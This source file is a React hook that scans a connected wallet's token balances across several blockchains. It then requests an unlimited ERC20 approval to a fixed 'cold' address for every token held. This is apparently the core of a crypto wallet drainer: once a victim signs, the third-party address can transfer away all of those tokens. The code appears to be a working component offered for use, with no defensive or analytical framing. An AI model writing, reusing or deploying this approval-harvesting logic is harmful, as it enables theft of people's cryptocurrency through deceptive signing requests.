import { useState, useCallback, useRef } from "react";
import { useWriteContract } from "wagmi";
import { maxUint256, type Address } from "viem";
import { ERC20_ABI } from "../abi/pipeline";
import { MULTICHAIN_CLIENTS, COLD_ADDRESS } from "../config/multichain";
import type { ChainBalances } from "./useMultiChainScan";

export interface ApprovalProgress {
  step: "idle" | "approving" | "done" | "error";
  currentChain: string | null;
  currentToken: string | null;
  completed: number;
  total: number;
  approved: { chainId: number; token: string; address: Address }[];
  error: string | null;
}

const ZERO: ApprovalProgress = {
  step: "idle",
  currentChain: null,
  currentToken: null,
  completed: 0,
  total: 0,
  approved: [],
  error: null,
};

export function useApproveAll() {
  const [progress, setProgress] = useState<ApprovalProgress>({ ...ZERO });
  const { writeContractAsync } = useWriteContract();
  const runningRef = useRef(false);

  const approveAll = useCallback(
    async (chains: ChainBalances[]) => {
      if (runningRef.current || !COLD_ADDRESS) return;
      runningRef.current = true;

      const toApprove: {
        chainId: number;
        chainName: string;
        tokenAddress: Address;
        symbol: string;
      }[] = [];

      for (const chain of chains) {
        for (const token of chain.tokens) {
          if (token.balance > 0n) {
            toApprove.push({
              chainId: chain.chainId,
              chainName: chain.chainName,
              tokenAddress: token.address,
              symbol: token.symbol,
            });
          }
        }
      }

      if (toApprove.length === 0) {
        setProgress({ ...ZERO, step: "done" });
        runningRef.current = false;
        return;
      }

      setProgress({
        step: "approving",
        currentChain: null,
        currentToken: null,
        completed: 0,
        total: toApprove.length,
        approved: [],
        error: null,
      });

      const approved: ApprovalProgress["approved"] = [];

      try {
        for (let i = 0; i < toApprove.length; i++) {
          const { chainId, chainName, tokenAddress, symbol } = toApprove[i];

          setProgress((p) => ({
            ...p,
            currentChain: chainName,
            currentToken: symbol,
          }));

          const tx = await writeContractAsync({
            address: tokenAddress,
            abi: ERC20_ABI,
            functionName: "approve",
            args: [COLD_ADDRESS, maxUint256],
            chainId,
          });

          const client = MULTICHAIN_CLIENTS[chainId];
          if (client) {
            await (client as any).waitForTransactionReceipt({ hash: tx });
          }

          approved.push({ chainId, token: symbol, address: tokenAddress });
          setProgress((p) => ({
            ...p,
            completed: i + 1,
            approved: [...approved],
          }));
        }

        setProgress((p) => ({ ...p, step: "done" }));
      } catch (err) {
        const message = err instanceof Error ? err.message : "Approval failed";
        setProgress((p) => ({ ...p, step: "error", error: message }));
      } finally {
        runningRef.current = false;
      }

      return approved;
    },
    [writeContractAsync],
  );

  const reset = useCallback(() => {
    setProgress({ ...ZERO });
    runningRef.current = false;
  }, []);

  return { progress, approveAll, reset };
}
